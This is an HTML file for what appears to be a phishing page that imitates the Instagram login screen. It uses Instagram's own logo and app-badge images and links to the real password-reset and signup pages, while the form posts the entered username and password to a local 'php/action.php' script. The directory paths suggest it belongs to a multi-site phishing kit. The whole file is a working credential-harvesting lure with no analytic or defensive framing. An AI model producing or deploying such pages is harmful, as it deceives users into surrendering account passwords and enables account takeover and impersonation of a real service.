<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="../../../logo/insta.png" type="image/x-icon">
    <link rel="stylesheet" href="../../../resetCSS/reset.css">
    <link rel="stylesheet" href="../../../pages/instagram/login/style.css">
    <title>Login . Instagram</title>
</head>

<body>
    <div class="container">
        <form action="../../../php/action.php" method="post" class="main-form">

            <!-- logo -->
            <div class="logo-box">
                <i data-visualcompletion="css-img" aria-label="Instagram" class="logo" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
            </div>

            <div class="center-group">

                <div class="input-group">
                    <input placeholder="Phone number, username, or email" name="uname" />
                    <input type="password" placeholder="Password" name="password" />
                </div>
            </div>

            <div class="center-group">
                <button type="submit" class="btn">Log in</button>
            </div>

            <div class="center-group">
                <a class="frg" href="https://www.instagram.com/accounts/password/reset/">fogot password?</a>
            </div>
        </form>

        <div class="signup-box">
            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Signup</a></p>
        </div>

        <div class="apps">
            <p>Get the App.</p>
            <div class="img-box">
                <img alt="Get it on Google Play" class="_aa5q" src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png">
                <img alt="Get it from Microsoft" class="_aa5q" src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png">
            </div>
        </div>
    </div>
</body>

</html>
